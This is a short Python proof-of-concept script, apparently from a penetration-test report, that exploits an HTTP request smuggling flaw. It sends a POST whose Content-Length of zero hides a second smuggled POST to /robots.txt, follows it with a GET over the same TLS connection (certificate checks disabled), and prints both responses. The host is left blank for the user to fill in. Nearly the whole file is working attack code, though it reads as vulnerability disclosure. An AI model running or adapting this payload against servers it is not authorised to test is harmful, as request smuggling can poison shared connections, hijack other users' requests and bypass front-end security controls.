# This script exploits the HTTP Request Smuggling vulnerability discovered during testing.
# Response 1 will returna response to '/'
# Response 2 will return the contents of robots.txt — this is the smuggled request.
# Remove the .txt extension and save this as a Python file before running.



import socket
import ssl

host = "enter host here"
port = 443

# First request: main request + smuggled request
first_request = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 0\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "POST /robots.txt HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 20\r\n"
    "\r\n"
    "abc"
)

# Second request
second_request = (
    "GET / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: close\r\n"
    "\r\n"
)

context = ssl._create_unverified_context()

with socket.create_connection((host, port)) as sock:
    with context.wrap_socket(sock, server_hostname=host) as ssock:
        print("[+] Sending the requests...")

        # Send both requests over the same connection
        ssock.sendall(first_request.encode())
        ssock.sendall(second_request.encode())

        # Read full response
        response_data = b""
        ssock.settimeout(2)
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
        except socket.timeout:
            pass

        # Decode and split responses
        full_response = response_data.decode(errors="ignore")
        split_responses = full_response.split("HTTP/1.1 ")

		# Print responses
        print("\n---------------- Response to Request 1 ----------------")
        print("HTTP/1.1 " + split_responses[1])

        print("\n---------------- Response to Request 2 ----------------")
        print("HTTP/1.1 " + split_responses[2])
